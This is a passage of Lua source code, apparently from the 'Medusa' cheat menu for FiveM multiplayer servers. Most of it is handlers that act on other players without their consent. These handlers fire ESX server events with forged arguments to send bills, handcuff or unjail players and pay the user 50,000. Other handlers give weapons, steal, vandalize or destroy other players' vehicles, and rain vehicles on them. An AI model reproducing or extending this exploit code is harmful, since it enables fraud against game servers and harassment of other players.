                Medusa.Functions.RainCar(Medusa.Data.Rain.RainAmount, "double", Medusa.Data.Rain.RainState, true, SelectedPlayer)
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("RainBikesSpam") then

			if Medusa.Button("Rain Bikes") then
                Medusa.Functions.RainCar(Medusa.Data.Rain.RainAmount, "double", Medusa.Data.Rain.RainState, false, SelectedPlayer)
			end
			
			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("RainCarLegit") then
			if Medusa.Button("Rain Cars") then 
                Medusa.Functions.RainCar(Medusa.Data.Rain.RainAmount, "fugitive", Medusa.Data.Rain.RainState, true, SelectedPlayer)
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("RainCarSpam") then
			if Medusa.Button("Rain Cars") then
                Medusa.Functions.RainCar(Medusa.Data.Rain.RainAmount, "fugitive", Medusa.Data.Rain.RainState, false, SelectedPlayer)
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("RainCustoLegit") then
			if Medusa.Button("Rain ".. Medusa.Config.Rain.Custom.model) then 
                Medusa.Functions.RainCar(Medusa.Data.Rain.RainAmount, Medusa.Config.Rain.Custom.model, Medusa.Data.Rain.RainState, true, SelectedPlayer)
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("RainCustoSpam") then
			if Medusa.Button("Rain ".. Medusa.Config.Rain.Custom.model) then
                print("Custom SPam")
                Medusa.Functions.RainCar(Medusa.Data.Rain.RainAmount, Medusa.Config.Rain.Custom.model, Medusa.Data.Rain.RainState, false, SelectedPlayer)
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		elseif Medusa.IsMenuOpened("ESXMenuPlayer") then
			if Medusa.Button("~g~ESX ~s~Send Bill") then
				local amount = KeyboardInput("Enter Amount", "", 10)
				local name = KeyboardInput("Enter the name of the Bill", "", 25)
				if amount and name then
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(SelectedPlayer), "Purposeless", name, amount)
				end
			elseif Medusa.Button("~g~ESX ~s~Handcuff Player") then
				TriggerServerEvent('esx_policejob:handcuff', GetPlayerServerId(SelectedPlayer))
			elseif Medusa.Button("~g~ESX ~s~Revive player") then
				TriggerServerEvent('esx_ambulancejob:revive', GetPlayerServerId(SelectedPlayer))
			elseif Medusa.Button("~g~ESX ~s~Unjail player") then
				TriggerServerEvent("esx_jail:unjailQuest", GetPlayerServerId(SelectedPlayer))
				TriggerServerEvent("js:removejailtime", GetPlayerServerId(SelectedPlayer))
			elseif Medusa.Button("~g~ESX ~s~Pay player 50k") then
				TriggerServerEvent("esx_truckerjob:pay", 50000)--Nuevo por Nacho =)
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("OnlineWepMenu") then
			Medusa.SetSubTitle("OnlineWepMenu", "Weapon Options - " .. GetPlayerName(SelectedPlayer) .. "")
			Medusa.MenuButton("Give Weapon", "OnlineWepCategory")

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("OnlineWepCategory") then
			Medusa.SetSubTitle("OnlineWepCategory", "Give Weapon - " .. GetPlayerName(SelectedPlayer) .. "")

			Medusa.MenuButton("Melee", "OnlineMeleeWeapons")
			Medusa.MenuButton("Handguns", "OnlineSidearmWeapons")
			Medusa.MenuButton("Submachine Guns")
			Medusa.MenuButton("Shotguns", "OnlineShotgunWeapons")
			Medusa.MenuButton("Assault Rifles", "OnlineAutorifleWeapons")
			Medusa.MenuButton("Light Machine Guns")
			Medusa.MenuButton("Sniper Rifles")
			Medusa.MenuButton("Heavy Weapons")

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("OnlineMeleeWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "melee" then
					if Medusa.Button(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 0, false, false)
					end
				end
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("OnlineSidearmWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "handguns" then
					if Medusa.Button(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 32, false, false)
					end
				end
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("OnlineAutorifleWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "assaultrifles" then
					if Medusa.Button(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 60, false, false)
					end
				end
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("OnlineShotgunWeapons") then
			for i = 1, #t_Weapons do
				if t_Weapons[i][5] == "shotguns" then
					if Medusa.Button(t_Weapons[i][2]) then
						GiveWeaponToPed(GetPlayerPed(SelectedPlayer), t_Weapons[i][1], 18, false, false)
					end
				end
			end

			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		
		elseif Medusa.IsMenuOpened("OnlineVehicleMenuPlayer") then
			Medusa.SetSubTitle("OnlineVehicleMenuPlayer", "Vehicle Options [" .. GetPlayerName(SelectedPlayer) .. "]")
			if Medusa.Button("Spawn Vehicle") then
				local ped = GetPlayerPed(SelectedPlayer)
				local ModelName = KeyboardInput("Enter Vehicle Model Name", "", 12)
				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end

					local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(GetPlayerPed(SelectedPlayer)), GetEntityHeading(GetPlayerPed(SelectedPlayer)), true, true)
					
					RequestControlOnce(ped)
					SetPedIntoVehicle(ped, veh, -1)
					TaskWarpPedIntoVehicle(ped, veh, -1)
					Medusa.SendNotification({text = NotifyFormat("Successfully spawned ~b~%s ~s~on ~b~%s", string.lower(GetDisplayNameFromVehicleModel(ModelName)), GetPlayerName(SelectedPlayer)), type = "info"})
				else
					Medusa.SendNotification({text = "Model is not valid", type = "error"})
				end
			end
			if Medusa.Button("Spawn Owned Vehicle") then
				local ped = GetPlayerPed(SelectedPlayer)
				local ModelName = KeyboardInput("Enter Vehicle Spawn Name", "", 20)
				local newPlate =  KeyboardInput("Enter Vehicle License Plate", "", 8)

				if ModelName and IsModelValid(ModelName) and IsModelAVehicle(ModelName) then
					RequestModel(ModelName)
					while not HasModelLoaded(ModelName) do
						Citizen.Wait(0)
					end

					local veh = CreateVehicle(GetHashKey(ModelName), GetEntityCoords(ped), GetEntityHeading(ped), true, true)
					SetVehicleNumberPlateText(veh, newPlate)
					local vehicleProps = Medusa.Game.GetVehicleProperties(veh)
					TriggerServerEvent('esx_vehicleshop:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
					TriggerServerEvent('esx_givecarkeys:setVehicleOwnedPlayerId', GetPlayerServerId(SelectedPlayer), vehicleProps)
					TriggerServerEvent('garage:addKeys', newPlate)
					SetPedIntoVehicle(GetPlayerPed(SelectedPlayer), veh, -1)
				else
					Medusa.SendNotification({ text = "Vehicle model " .. ModelName .. " does not exist!", type = "error"})
				end
			end
			if Medusa.Button("Kick From Vehicle") then
				ClearPedTasksImmediately(GetPlayerPed(SelectedPlayer))
			end
			if Medusa.Button("Delete Vehicle") then
				local playerPed = GetPlayerPed(SelectedPlayer)
				local veh = GetVehiclePedIsIn(playerPed)
				RemoveVehicle(veh)
			end
			if Medusa.Button("Destroy Engine") then

				local playerPed = GetPlayerPed(SelectedPlayer)
				local playerVeh = GetVehiclePedIsUsing(playerPed)
				local vehNet = VehToNet(playerVeh)
				NetworkRequestControlOfNetworkId(vehNet)
				playerVeh = NetToVeh(vehNet)
				NetworkRequestControlOfEntity(playerVeh)

				RequestControlOnce(playerVeh)

				--SetVehicleUndriveable(veh, true)
				SetVehicleEngineHealth(playerVeh, 0)
			end
			if Medusa.Button("Steal Vehicle") then

				local ped = GetPlayerPed(SelectedPlayer)
				local vehicle = GetVehiclePedIsUsing(ped)
				local StealVehicleThread = StealVehicle(vehicle)
			end

			if Medusa.Button("Repair Vehicle") then
				local ped = GetPlayerPed(SelectedPlayer)
				local vehicle = GetVehiclePedIsUsing(ped)
				RepairVehicle(vehicle)
			end

			if Medusa.Button("Vandalize Car") then
				local playerPed = GetPlayerPed(SelectedPlayer)
				local playerVeh = GetVehiclePedIsIn(playerPed, true)
				local vehNet = VehToNet(playerVeh)
				NetworkRequestControlOfNetworkId(vehNet)
				playerVeh = NetToVeh(vehNet)
				NetworkRequestControlOfEntity(playerVeh)
				StartVehicleAlarm(playerVeh)
				DetachVehicleWindscreen(playerVeh)
				SmashVehicleWindow(playerVeh, 0)
				SmashVehicleWindow(playerVeh, 1)
				SmashVehicleWindow(playerVeh, 2)
				SmashVehicleWindow(playerVeh, 3)
				SetVehicleTyreBurst(playerVeh, 0, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 1, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 2, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 3, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 5, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 4, true, 1000.0)
				SetVehicleTyreBurst(playerVeh, 7, true, 1000.0)
				SetVehicleDoorBroken(playerVeh, 0, true)
				SetVehicleDoorBroken(playerVeh, 1, true)
				SetVehicleDoorBroken(playerVeh, 2, true)
				SetVehicleDoorBroken(playerVeh, 3, true)
				SetVehicleDoorBroken(playerVeh, 4, true)
				SetVehicleDoorBroken(playerVeh, 5, true)
				SetVehicleDoorBroken(playerVeh, 6, true)
				SetVehicleDoorBroken(playerVeh, 7, true)
				SetVehicleLights(playerVeh, 1)
				Citizen.InvokeNative(0x1FD09E7390A74D54, playerVeh, 1)
				SetVehicleNumberPlateTextIndex(playerVeh, 5)
				SetVehicleNumberPlateText(playerVeh, "Medusa Menu")
				SetVehicleDirtLevel(playerVeh, 10.0)
				SetVehicleModColor_1(playerVeh, 1)
				SetVehicleModColor_2(playerVeh, 1)
				SetVehicleCustomPrimaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b) -- r = 231, g = 76, b = 60
				SetVehicleCustomSecondaryColour(playerVeh, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b)
				SetVehicleBurnout(playerVeh, true)
				Medusa.SendNotification({text = "~g~Vehicle Fucked Up!", type = "info"})
			end
			Medusa.DrawPlayerInfo(SelectedPlayer)
			Medusa.Display()
		end

		for i, mods in pairs(LSC.vehicleMods) do
			if mods.meta == "modHorns" then
				if Medusa.IsMenuOpened(mods.meta) then
					for j = 0, 51, 1 do
						if j == currentMods[mods.meta] then
							if Medusa.Button(LSC.GetHornName(j), "Installed", nil, _menuColor.base) then 
								RemoveVehicleMod(Medusa.Player.Vehicle, mods.id)
								LSC.UpdateMods()
							end
						else
							if Medusa.Button(LSC.GetHornName(j), "Not Installed") then 
								SetVehicleMod(Medusa.Player.Vehicle, mods.id, j)
								LSC.UpdateMods()
							end
						end
					end
					Medusa.Display()
				end
			elseif mods.meta == "modFrontWheels" or mods.meta == "modBackWheels" then
				if Medusa.IsMenuOpened(mods.meta) then
					local modCount = GetNumVehicleMods(Medusa.Player.Vehicle, mods.id)
					for j = 0, modCount, 1 do
						local modName = GetModTextLabel(Medusa.Player.Vehicle, mods.id, j)
						if modName then
							if j == currentMods[mods.meta] then
								if Medusa.Button(GetLabelText(modName), "Installed", nil, _menuColor.base) then 
									RemoveVehicleMod(Medusa.Player.Vehicle, mods.id)
									LSC.UpdateMods()
								end
							else
								if Medusa.Button(GetLabelText(modName), "Not Installed") then 
									SetVehicleMod(Medusa.Player.Vehicle, mods.id, j)
									LSC.UpdateMods()
								end
							end
						end
					end
					Medusa.Display()
				end
			else
				if Medusa.IsMenuOpened(mods.meta) then
					local modCount = GetNumVehicleMods(Medusa.Player.Vehicle, mods.id)
					for j = 0, modCount, 1 do
						local modName = GetModTextLabel(Medusa.Player.Vehicle, mods.id, j)
						if modName then
							if j == currentMods[mods.meta] then
								if Medusa.Button(GetLabelText(modName), "Installed", nil, _menuColor.base) then 
									RemoveVehicleMod(Medusa.Player.Vehicle, mods.id)
									LSC.UpdateMods()
								end
							else
								if Medusa.Button(GetLabelText(modName), "Not Installed") then 
									SetVehicleMod(Medusa.Player.Vehicle, mods.id, j)
									LSC.UpdateMods()
								end
							end
						end
					end
					Medusa.Display()
				end
			end
		end

		
		Wait(0)
	end
end
CreateThread(MenuRuntimeThread)


-- DrawPlayerInfoTest = {
-- 	pedHeadshot = false,
-- 	txd = "null",
-- 	handle = nil,
-- 	currentPlayer = -1,
-- }


-- 		-- Current player selected
-- 		DrawPlayerInfoTest.currentPlayer = player

-- 		-- Drawing coordinates
-- 		DrawPlayerInfoTest.mugshotWidth = buttonHeight / aspectRatio
-- 		DrawPlayerInfoTest.mugshotHeight = DrawPlayerInfoTest.mugshotWidth * aspectRatio
-- 		DrawPlayerInfoTest.x = menus[currentMenu].x - frameWidth / 2 - frameWidth - previewWidth / 2 
-- 		DrawPlayerInfoTest.y = menus[currentMenu].y + titleHeight
		
-- 		-- Player init
-- 		DrawPlayerInfoTest.playerPed = GetPlayerPed(DrawPlayerInfoTest.currentPlayer)
-- 		DrawPlayerInfoTest.playerName = Medusa:CheckName(GetPlayerName(DrawPlayerInfoTest.currentPlayer))


-- 		local function RegisterPedHandle()
			
-- 			if DrawPlayerInfoTest.handle and IsPedheadshotValid(DrawPlayerInfoTest.handle) then
		
-- 				DrawPlayerInfoTest.pedHeadshot = false
-- 				UnregisterPedheadshot(DrawPlayerInfoTest.handle)
-- 				DrawPlayerInfoTest.handle = nil
-- 				DrawPlayerInfoTest.txd = "null"
		
-- 			end
		
-- 			-- Get the ped headshot image.
-- 			DrawPlayerInfoTest.handle = RegisterPedheadshot(DrawPlayerInfoTest.playerPed)
		
-- 			while not IsPedheadshotReady(DrawPlayerInfoTest.handle) or not IsPedheadshotValid(DrawPlayerInfoTest.handle) do
-- 				Wait(50)
-- 			end
			
-- 			if IsPedheadshotReady(DrawPlayerInfoTest.handle) and IsPedheadshotValid(DrawPlayerInfoTest.handle) then
-- 				DrawPlayerInfoTest.txd = GetPedheadshotTxdString(DrawPlayerInfoTest.handle)
-- 				DrawPlayerInfoTest.pedHeadshot = true
-- 			else
-- 				DrawPlayerInfoTest.pedHeadshot = false
-- 			end
-- 		end
-- 		CreateThreadNow(RegisterPedHandle)



-- function puta()
-- 	local runtime_txd = CreateRuntimeTxd("fm")
-- 	local banner_dui = CreateDui("https://steamuserimages-a.akamaihd.net/ugc/920127008809316166/181F52EA6D13AA6BA9CC9E6722B6642A90A182B4/", 300, 300)
-- 	local b_dui = GetDuiHandle(banner_dui)
-- 	CreateRuntimeTextureFromDuiHandle(runtime_txd, "menu_bg", b_dui)
-- 	DrawSprite("fm", "menu_bg", 0.5, 0.5, 0.5, 0.5, 0.5, 0, 0, 0, 15)
-- end


-- Citizen.CreateThread(function()
--     while true do
--         Citizen.Wait(0)
--         puta()
--     end
-- end)

